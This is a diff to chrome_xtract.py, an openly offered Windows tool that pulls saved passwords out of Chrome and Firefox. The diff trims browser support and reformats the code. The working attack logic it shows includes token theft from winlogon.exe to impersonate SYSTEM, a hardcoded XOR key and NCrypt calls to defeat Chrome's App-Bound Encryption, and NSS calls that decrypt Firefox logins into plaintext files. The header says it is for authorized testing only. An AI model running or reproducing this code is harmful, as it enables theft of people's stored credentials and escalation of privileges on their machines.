@@ -3,26 +3,22 @@
 """
 chrome_xtract.py
 ================
-Browser Password Extractor — mohanmg04/browser-data-extractor
+Browser Password Extractor -- mohanmg04/browser-data-extractor
 https://github.com/mohanmg04/browser-data-extractor
 
-Extracts saved passwords from Chromium-based browsers and Firefox.
+Extracts saved passwords from Google Chrome and Mozilla Firefox.
 For authorized penetration testing and security research only.
 
 Supported Browsers
 ------------------
-  chrome    Google Chrome
-  edge      Microsoft Edge
-  brave     Brave Browser
-  chromium  Chromium
-  cft       Chrome for Testing
-  firefox   Mozilla Firefox
+  chrome   Google Chrome
+  firefox  Mozilla Firefox
 
 Encryption Support
 ------------------
-  Chromium v10  →  DPAPI (current-user scope)
-  Chromium v20  →  App-Bound Encryption (requires Admin / SYSTEM)
-  Firefox        →  NSS / PK11SDR_Decrypt via nss3.dll
+  Chrome v10  ->  DPAPI (current-user scope)
+  Chrome v20  ->  App-Bound Encryption (requires Admin / SYSTEM)
+  Firefox     ->  NSS / PK11SDR_Decrypt via nss3.dll
 
 Requirements
 ------------
@@ -33,16 +29,15 @@ Usage
 -----
   python chrome_xtract.py -Browser chrome
   python chrome_xtract.py -Browser firefox
-  python chrome_xtract.py -Browser edge    -Output passwords.json
-  python chrome_xtract.py -Browser brave   -Verbose
-  python chrome_xtract.py -Browser firefox -Output firefox.csv -HideBanner
+  python chrome_xtract.py -Browser chrome  -Output passwords.json
+  python chrome_xtract.py -Browser firefox -Output passwords.csv -HideBanner
 """
 
 import os, sys, gc, json, time, shutil, sqlite3, ctypes, ctypes.wintypes
 import tempfile, argparse
 from base64 import b64decode
 
-# ── dependency check ──────────────────────────────────────────────────────────
+# -- dependency check ---------------------------------------------------------
 try:
     from cryptography.hazmat.primitives.ciphers.aead import AESGCM
 except ImportError:
@@ -103,13 +98,9 @@ XOR_KEY = bytes.fromhex(
     "03A29E90274FB2FCF59BA4B75C392390"
 )
 
-# NCrypt key names per browser — Edge uses its own key, others share Chrome's
+# NCrypt key name for Chrome's App-Bound Encryption
 BROWSER_NCRYPT_KEYS: dict[str, list[str]] = {
-    "chrome":   ["Google Chromekey1"],
-    "edge":     ["Microsoft Edgekey1", "Google Chromekey1"],
-    "brave":    ["Google Chromekey1"],
-    "chromium": ["Google Chromekey1"],
-    "cft":      ["Google Chromekey1"],
+    "chrome": ["Google Chromekey1"],
 }
 
 _LAPPDATA  = os.environ.get("LOCALAPPDATA", "")
@@ -118,25 +109,9 @@ _PROGFILES = os.environ.get("PROGRAMFILES", r"C:\Program Files")
 _PROGFX86  = os.environ.get("PROGRAMFILES(X86)", r"C:\Program Files (x86)")
 
 CHROMIUM_PATHS: dict[str, dict[str, str]] = {
-    "chrome":   {
+    "chrome": {
         "local_state": rf"{_LAPPDATA}\Google\Chrome\User Data\Local State",
         "user_data":   rf"{_LAPPDATA}\Google\Chrome\User Data",
-    },
-    "edge":     {
-        "local_state": rf"{_LAPPDATA}\Microsoft\Edge\User Data\Local State",
-        "user_data":   rf"{_LAPPDATA}\Microsoft\Edge\User Data",
-    },
-    "brave":    {
-        "local_state": rf"{_LAPPDATA}\BraveSoftware\Brave-Browser\User Data\Local State",
-        "user_data":   rf"{_LAPPDATA}\BraveSoftware\Brave-Browser\User Data",
-    },
-    "chromium": {
-        "local_state": rf"{_LAPPDATA}\Chromium\User Data\Local State",
-        "user_data":   rf"{_LAPPDATA}\Chromium\User Data",
-    },
-    "cft": {
-        "local_state": rf"{_LAPPDATA}\Google\Chrome for Testing\User Data\Local State",
-        "user_data":   rf"{_LAPPDATA}\Google\Chrome for Testing\User Data",
     },
 }
 
@@ -149,15 +124,11 @@ FIREFOX_INSTALL_CANDIDATES = [
 FIREFOX_PROFILES_DIR = rf"{_APPDATA}\Mozilla\Firefox\Profiles"
 
 BROWSER_DISPLAY = {
-    "chrome":   "Google Chrome",
-    "edge":     "Microsoft Edge",
-    "brave":    "Brave Browser",
-    "chromium": "Chromium",
-    "cft":      "Chrome for Testing",
-    "firefox":  "Mozilla Firefox",
+    "chrome":  "Google Chrome",
+    "firefox": "Mozilla Firefox",
 }
 
-ALL_BROWSERS = list(CHROMIUM_PATHS.keys()) + ["firefox"]
+ALL_BROWSERS = ["chrome", "firefox"]
 
 
 # =============================================================================
@@ -174,9 +145,9 @@ def _hex(label: str, data: bytes | None) -> None:
         print(C.info(f"{label}: {h}"))
 
 
-# ─────────────────────────────────────────────────────────────────────────────
-# ██████████████████████████  CHROMIUM SECTION  ███████████████████████████████
-# ─────────────────────────────────────────────────────────────────────────────
+# -----------------------------------------------------------------------------
+# CHROMIUM SECTION
+# -----------------------------------------------------------------------------
 
 # =============================================================================
 # Windows DLL bindings (Chromium)
@@ -423,7 +394,7 @@ def invoke_impersonate() -> bool:
         print(C.err("winlogon.exe not found"))
         return False
 
-    _log(f"winlogon.exe PID → {winlogon_pid}")
+    _log(f"winlogon.exe PID -> {winlogon_pid}")
     proc_h = tok_h = dup_h = None
     try:
         ph = kernel32.OpenProcess(PROCESS_QUERY_INFORMATION, False, winlogon_pid)
@@ -450,7 +421,7 @@ def invoke_impersonate() -> bool:
         if is_system():
             _log("Impersonated NT AUTHORITY\\SYSTEM")
             return True
-        print(C.err(f"Impersonation check failed — SID: {get_current_sid()}")); return False
+        print(C.err(f"Impersonation check failed - SID: {get_current_sid()}")); return False
 
     except Exception as exc:
         print(C.err(f"invoke_impersonate: {exc}")); return False
@@ -464,7 +435,7 @@ def invoke_impersonate() -> bool:
 # NCrypt
 # =============================================================================
 def _ncrypt_decrypt_with_key(input_data: bytes, key_name: str) -> bytes:
-    """Low-level NCrypt decrypt — tries one specific key name."""
+    """Low-level NCrypt decrypt - tries one specific key name."""
     PROVIDER = "Microsoft Software Key Storage Provider"
     prov_h = ctypes.c_void_p(0)
     key_h  = ctypes.c_void_p(0)
@@ -541,7 +512,7 @@ def parse_chrome_key_blob(blob: bytes) -> dict:
         result["Iv"]         = blob[off:off+12]; off += 12
         result["Ciphertext"] = blob[off:off+32]; off += 32
         result["Tag"]        = blob[off:off+16]
-    elif flag == 3:
+    elif flag in (3, 98):   # 98 = 0x62 - seen on Microsoft Edge
         result["EncryptedAesKey"] = blob[off:off+32]; off += 32
         result["Iv"]              = blob[off:off+12]; off += 12
         result["Ciphertext"]      = blob[off:off+32]; off += 32
@@ -550,13 +521,13 @@ def parse_chrome_key_blob(blob: bytes) -> dict:
         raise ValueError(f"Unsupported blob flag: {flag}")
     return result
 
-def decrypt_chrome_key_blob(parsed: dict) -> bytes:
-    if parsed["Flag"] != 3:
+def decrypt_chrome_key_blob(parsed: dict, browser: str = "chrome") -> bytes:
+    if parsed["Flag"] not in (3, 98):
         raise NotImplementedError(f"Blob flag {parsed['Flag']} not supported")
     if not invoke_impersonate():
         raise PermissionError("Could not impersonate SYSTEM for NCryptDecrypt")
     try:
-        raw_aes   = decrypt_with_ncrypt(parsed["EncryptedAesKey"])
+        raw_aes   = decrypt_with_ncrypt(parsed["EncryptedAesKey"], browser)
         final_aes = xor_bytes(raw_aes, XOR_KEY)
         return aes_gcm_decrypt(final_aes, parsed["Iv"], parsed["Ciphertext"], parsed["Tag"])
     finally:
@@ -575,7 +546,7 @@ def get_master_key_v10(local_state_path: str) -> bytes:
     _hex("Master key (v10)", key)
     return key
 
-def get_master_key_v20(local_state_path: str) -> bytes:
+def get_master_key_v20(local_state_path: str, browser: str = "chrome") -> bytes:
     if not is_admin() and not is_system():
         raise PermissionError("Admin or SYSTEM rights required for v20 (ABE) decryption")
     with open(local_state_path, encoding="utf-8") as f:
@@ -595,7 +566,7 @@ def get_master_key_v20(local_state_path: str) -> bytes:
     _log(f"Round-2 output: {len(second)} bytes")
     parsed = parse_chrome_key_blob(second)
     _log(f"Key blob flag: {parsed['Flag']}")
-    return decrypt_chrome_key_blob(parsed)
+    return decrypt_chrome_key_blob(parsed, browser)
 
 
 # =============================================================================
@@ -675,9 +646,9 @@ def extract_chromium_passwords(profile: str, browser: str, pname: str, master_ke
     return results
 
 
-# ─────────────────────────────────────────────────────────────────────────────
-# ██████████████████████████  FIREFOX SECTION  ████████████████████████████████
-# ─────────────────────────────────────────────────────────────────────────────
+# -----------------------------------------------------------------------------
+# FIREFOX SECTION
+# -----------------------------------------------------------------------------
 
 # =============================================================================
 # NSS structure
@@ -836,7 +807,7 @@ def run_firefox(output: str | None) -> None:
 
         ret = nss3.NSS_Init(profile_path_b)
         if ret != 0:
-            print(C.warn(f"NSS_Init failed for {pname} (code {ret}) — skipping"))
+            print(C.warn(f"NSS_Init failed for {pname} (code {ret}) - skipping"))
             continue
 
         _log(f"NSS_Init OK for {pname}")
@@ -858,9 +829,9 @@ def run_firefox(output: str | None) -> None:
         print(C.warn("No saved passwords found."))
 
 
-# ─────────────────────────────────────────────────────────────────────────────
-# ██████████████████████████  SHARED OUTPUT  ██████████████████████████████████
-# ─────────────────────────────────────────────────────────────────────────────
+# -----------------------------------------------------------------------------
+# SHARED OUTPUT
+# -----------------------------------------------------------------------------
 
 def print_table(rows: list[dict]) -> None:
     if not rows: return
@@ -872,7 +843,7 @@ def print_table(rows: list[dict]) -> None:
     sep = "  "
     hdr = sep.join(f"{c:<{widths[c]}}" for c in cols)
     bar = sep.join("-" * widths[c]      for c in cols)
-    print(f"\n{C.head('  ── PASSWORDS ──')}\n")
+    print(f"\n{C.head('  -- PASSWORDS --')}\n")
     print(f"{C.BLD}{hdr}{C.RST}")
     print(f"{C.DIM}{bar}{C.RST}")
     for r in rows:
@@ -899,19 +870,19 @@ def save_output(rows: list[dict], path: str) -> None:
                     f"Password : {r['Password']}\n"
                     f"{'-'*50}\n"
                 )
-    print(C.ok(f"Saved {len(rows)} password(s) → {path}"))
+    print(C.ok(f"Saved {len(rows)} password(s) -> {path}"))
 
 def print_summary(browser_display: str, profiles: int, total: int) -> None:
-    print(f"\n{C.head('  ── SUMMARY ──')}\n")
+    print(f"\n{C.head('  -- SUMMARY --')}\n")
     print(f"  {'Browser'  :<10}: {browser_display}")
     print(f"  {'User'     :<10}: {os.environ.get('USERNAME', '?')}")
     print(f"  {'Profiles' :<10}: {profiles}")
     print(f"  {'Passwords':<10}: {C.ok(str(total)) if total else C.warn('0')}\n")
 
 
-# ─────────────────────────────────────────────────────────────────────────────
-# ██████████████████████████  BANNER + MAIN  ██████████████████████████████████
-# ─────────────────────────────────────────────────────────────────────────────
+# -----------------------------------------------------------------------------
+# BANNER + MAIN
+# -----------------------------------------------------------------------------
 
 BANNER = rf"""
 {C.CYN}   _____ _                              _  __  ___           __
@@ -920,7 +891,7 @@ BANNER = rf"""
  | |___ | | || | | (_) || | | | | |  __/ | |  |  _  | >  < \__ \
   \____||_|_||_|  \___/ |_| |_| |_|\___|_|_|  |_| |_|/_/\_\ ___/{C.RST}
 
-  {C.DIM}Browser Password Extractor  ·  github.com/mohanmg04/browser-data-extractor{C.RST}
+  {C.DIM}Browser Password Extractor  |  github.com/mohanmg04/browser-data-extractor{C.RST}
   {C.YEL}For authorized security research and laboratory environments only.{C.RST}
 """
 
@@ -945,12 +916,12 @@ def chrome_xtract(
     _log(f"Admin  : {is_admin()}")
     _log(f"SYSTEM : {is_system()}")
 
-    # ── Firefox path ──────────────────────────────────────────────────────────
+    # -- Firefox path ----------------------------------------------------------
     if browser.lower() == "firefox":
         run_firefox(output)
         return
 
-    # ── Chromium path ─────────────────────────────────────────────────────────
+    # -- Chromium path ---------------------------------------------------------
     paths = CHROMIUM_PATHS.get(browser.lower())
     if not paths:
         print(C.err(f"Unsupported browser: {browser}")); return
@@ -973,7 +944,7 @@ def chrome_xtract(
     print(C.info(f"Blob type: {blob_type}"))
 
     try:
-        master_key = get_master_key_v20(local_state) if blob_type == "v20" \
+        master_key = get_master_key_v20(local_state, browser) if blob_type == "v20" \
                      else get_master_key_v10(local_state)
         print(C.ok("Master key decrypted"))
     except PermissionError as exc:
@@ -1003,7 +974,7 @@ def chrome_xtract(
 # =============================================================================
 if __name__ == "__main__":
     parser = argparse.ArgumentParser(
-        description="chrome_xtract.py — Browser Password Extractor",
+        description="chrome_xtract.py - Browser Password Extractor",
         formatter_class=argparse.RawDescriptionHelpFormatter,
         epilog="""
 examples:
@@ -1014,14 +985,14 @@ examples:
   [2] Extract passwords from Firefox
       python chrome_xtract.py -Browser firefox
 
-  [3] Extract from Edge — save as JSON
-      python chrome_xtract.py -Browser edge -Output passwords.json
+  [3] Save Chrome passwords as JSON
+      python chrome_xtract.py -Browser chrome -Output passwords.json
 
-  [4] Extract from Brave — save as CSV
-      python chrome_xtract.py -Browser brave -Output passwords.csv
+  [4] Save Firefox passwords as CSV
+      python chrome_xtract.py -Browser firefox -Output passwords.csv
 
   [5] Verbose run, suppress banner
-      python chrome_xtract.py -Browser firefox -Verbose -HideBanner
+      python chrome_xtract.py -Browser chrome -Verbose -HideBanner
         """,
     )
     parser.add_argument(
@@ -1029,7 +1000,7 @@ examples:
         required=True,
         choices=ALL_BROWSERS,
         metavar="BROWSER",
-        help="chrome | edge | brave | chromium | cft | firefox",
+        help="chrome | firefox",
     )
     parser.add_argument("-Verbose",    action="store_true", help="Enable verbose / debug output")
     parser.add_argument("-HideBanner", action="store_true", help="Suppress the ASCII banner")
